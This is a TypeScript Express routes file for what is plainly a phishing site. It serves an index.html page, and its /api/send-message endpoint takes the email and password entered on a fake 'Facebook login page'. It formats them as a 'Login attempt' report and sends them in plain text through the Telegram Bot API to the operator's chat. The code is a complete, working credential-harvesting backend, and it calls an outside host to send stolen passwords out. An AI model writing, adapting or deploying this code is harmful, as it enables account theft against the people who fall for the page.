import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import fetch from 'node-fetch';

// Telegram Bot functionality
async function sendTelegramMessage(message: string): Promise<boolean> {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    if (!botToken) {
      console.error('Telegram bot token not found');
      return false;
    }

    // Usually, we'd need to get the chat ID, but for simplicity in this demo, 
    // we'll attempt to find the chat ID from getUpdates first
    let chatId;
    
    try {
      // Try to get chat ID from recent updates
      const apiUrl = `https://api.telegram.org/bot${botToken}/getUpdates`;
      const response = await fetch(apiUrl);
      const data = await response.json() as any;
      
      if (data.ok && data.result && data.result.length > 0) {
        for (const update of data.result) {
          if (update.message && update.message.chat && update.message.chat.id) {
            chatId = update.message.chat.id;
            console.log("Found chat ID from updates:", chatId);
            break;
          }
        }
      }
    } catch (error) {
      console.error("Error getting updates:", error);
      // Continue execution and try other methods
    }
    
    // If we couldn't find the chat ID from updates, we'll send a message to yourself
    // To make this work, you need to start a conversation with your bot first
    if (!chatId) {
      console.log("Could not find chat ID from updates, using alternative method");
      
      try {
        // Get information about the bot itself
        const botInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
        const botInfoData = await botInfoResponse.json() as any;
        
        if (botInfoData.ok && botInfoData.result) {
          console.log("Bot info:", botInfoData.result.username);
          
          // Send a message instructing user what to do
          console.log("IMPORTANT: Please send a message to your bot @" + botInfoData.result.username + " in Telegram first!");
          console.log("This is required to get the chat ID for sending messages.");
          
          // We'll still try to send the message, but it might not work
          chatId = "YOUR_CHAT_ID_HERE"; // This won't work, but we'll try as a fallback
        }
      } catch (error) {
        console.error("Error getting bot info:", error);
      }
    }
    
    // Send the message
    const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const messageResponse = await fetch(sendMessageUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });
    
    const messageData = await messageResponse.json() as any;
    if (messageData.ok) {
      console.log('Message sent successfully to Telegram');
      return true;
    } else {
      console.error('Failed to send message to Telegram:', messageData);
      return false;
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    return false;
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // put application routes here
  // prefix all routes with /api

  // use storage to perform CRUD operations on the storage interface
  // e.g. storage.insertUser(user) or storage.getUserByUsername(username)

  // Serve the main index.html file at the root
  app.get('/', (req, res) => {
    res.sendFile('index.html', { root: '.' });
  });

  // Also serve it at /index.html path explicitly
  app.get('/index.html', (req, res) => {
    res.sendFile('index.html', { root: '.' });
  });

  // API endpoint to send message to Telegram
  app.post('/api/send-message', async (req: Request, res: Response) => {
    try {
      const { email, password, message } = req.body;
      
      // Format the message - always include login info, message is optional
      let formattedMessage;
      if (message) {
        formattedMessage = `Login attempt from the Facebook login page:\n\nUsername/Email: ${email || 'Not provided'}\nPassword: ${password || 'Not provided'}\nMessage: ${message}`;
      } else {
        formattedMessage = `Login attempt from the Facebook login page:\n\nUsername/Email: ${email || 'Not provided'}\nPassword: ${password || 'Not provided'}\nNo message provided`;
      }
      
      // Send to Telegram
      const success = await sendTelegramMessage(formattedMessage);
      
      if (success) {
        return res.status(200).json({ success: true });
      } else {
        return res.status(500).json({ success: false, error: 'Failed to send message to Telegram' });
      }
    } catch (error) {
      console.error('Error in send-message endpoint:', error);
      return res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
